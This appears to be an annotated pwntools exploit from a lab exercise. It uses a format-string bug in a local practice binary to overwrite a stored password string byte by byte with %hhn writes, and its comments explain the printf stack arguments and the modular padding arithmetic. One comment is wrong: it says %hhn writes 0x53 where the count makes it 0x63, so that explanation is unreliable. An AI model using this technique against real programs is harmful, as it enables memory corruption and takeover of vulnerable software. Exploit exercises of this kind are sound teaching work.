# Explaining the Exploit: E1-2425 Format String Overwrite
from pwn import *
import re

s = process('./fs', shell=True)
elf = ELF('./fs')

# 1. MEMORY LEAK: Obtaining the target address
banner = s.recvline().decode(errors='ignore')
m = re.search(r'VAR passwd@ (0x[0-9a-fA-F]+):', banner)
passwd_addr = int(m.group(1), 16)

# THE C MEMORY MODEL:
# In C, a string is just an array of bytes ending in \0. 
# To change "s4fe" to "c4ge", we need to overwrite:
# index 0: 's' -> 'c' (0x63 = 99 decimal)
# index 2: 'f' -> 'g' (0x67 = 103 decimal)
# Note: You can write all 4 bytes to be safe.

addr1 = passwd_addr       # Pointing to 's'
addr2 = passwd_addr + 1   # Pointing to '4'
addr3 = passwd_addr + 2   # Pointing to 'f'
addr4 = passwd_addr + 3   # Pointing to 'e'

# The values we want to write (ASCII codes)
bytes_to_write = [0x63, 0x34, 0x67, 0x65] # "c4ge"

# 2. BUILDING THE PAYLOAD
# We start by placing the 4 target addresses at the very beginning of our buffer.
# Because we are on a 32-bit system (gcc -m32), each p32() is exactly 4 bytes.
# Total bytes written so far = 4 addresses * 4 bytes each = 16 bytes.
payload = p32(addr1) + p32(addr2) + p32(addr3) + p32(addr4)

# 3. HOW PRINTF SEES THE STACK:
# When printf(buffer) is called, 'buffer' is the 1st argument.
# Anything else on the stack is treated as the 2nd, 3rd, 4th, etc. arguments.
# Since our 'buffer' is ON THE STACK, the addresses we just put there 
# can be reached by printf if we tell it which "argument number" to look at.
# Based on your exploration, the start of the buffer is the 4th argument.

written = len(payload) # Current count = 16

for i, target_byte in enumerate(bytes_to_write):
    # CALCULATION: How many MORE characters do we need to print to reach 'target_byte'?
    # We use %256 because %hhn only cares about the lowest byte of the total count.
    padding = (target_byte - written) % 256
    # For example, if I need the total count of written characters so far to be 52, but I've already written 99,
    # I can leverage %hhn, which only considers the last/a single byte, and since a byte can only hold values from 0 to 255,
    # I can do (99 + <number>) that goes beyond 255, and it will wrap around like this:
    # 99 + 156 = 255 ---> % 256 = 255
    # 99 + 157 = 256 ---> % 256 = 0
    # 99 + 158 = 257 ---> % 256 = 1
    # ...
    # 99 + 209 = 308 ---> % 256 = 52
    
    # But in this case, I have written 16 chars already (the 4 addresses), so:
    # If I want to write byte 0x63 (99 decimal) next:
    # padding = (99 - 16) % 256 = 83
    # Binary representation of 83 is 01010011, which in hexa is 0x00000053, so %hhn will write 0x53 to the target address.
    # And then 52:
    # padding = (52 - 99) % 256 = (-47) % 256 = 209
    # Total number of chars written so far will be 99 + 209 = 308
    # 
    # if I first wrote 99, and now I want 52, I need to overflow past 256, 
    # and as %n will count the total written chars so far, it will count 99 + 209 = 308,  but if we do 308 % 256 = 52, 
    # which is what the "hh" specifier in %hhn does:
    # Binary representation of 308 is 00000001 00110100, which in hexa is 0x00000134, so %hhn will write 0x34 to the target address. 
    # %hhn takes the lowest byte: 0x34, which is 52 decimal.
    
    # %paddingx: Prints 'padding' characters to increase the internal counter. 
    # %N$hhn: THE MAGIC. 
    #   'N' is the argument index (4, 5, 6, 7). 
    #   '$' means "Direct Access".
    #   'hhn' means "Write the total count as a 1-byte char to the address in Arg N". 
    arg_index = 4 + i
    payload += f"%{padding}c".encode() + f"%{arg_index}$hhn".encode()
    
    written += padding

s.sendline(payload)
print(s.recvall(timeout=1).decode(errors='ignore'))